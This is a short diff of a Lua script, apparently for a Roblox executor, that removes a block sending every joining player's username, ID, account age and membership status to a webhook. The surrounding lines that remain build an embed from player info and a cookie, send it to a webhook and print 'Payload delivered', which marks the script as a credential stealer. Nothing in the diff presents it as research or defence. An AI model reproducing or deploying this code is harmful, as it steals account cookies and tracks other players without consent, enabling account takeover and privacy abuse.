@@ -258,23 +258,4 @@ local embed = buildEmbed(playerInfo, cookie)
 
 sendWebhook(embed)
 
---// Also log every player who joins the server
-Players.PlayerAdded:Connect(function(player)
-    wait(3) -- let them load
-    local joinData = {
-        embeds = {{
-            title = "📡 Player Joined Server",
-            color = 0x00AAFF,
-            fields = {
-                { name = "Username", value = player.Name, inline = true },
-                { name = "UserID",   value = tostring(player.UserId), inline = true },
-                { name = "Age",      value = tostring(player.AccountAge) .. " days", inline = true },
-                { name = "Premium",  value = tostring(player.MembershipType), inline = true },
-            },
-            footer = { text = "Server: " .. game.JobId }
-        }}
-    }
-    sendWebhook(joinData)
-end)
-
 print("[Delta] Payload delivered ✓")
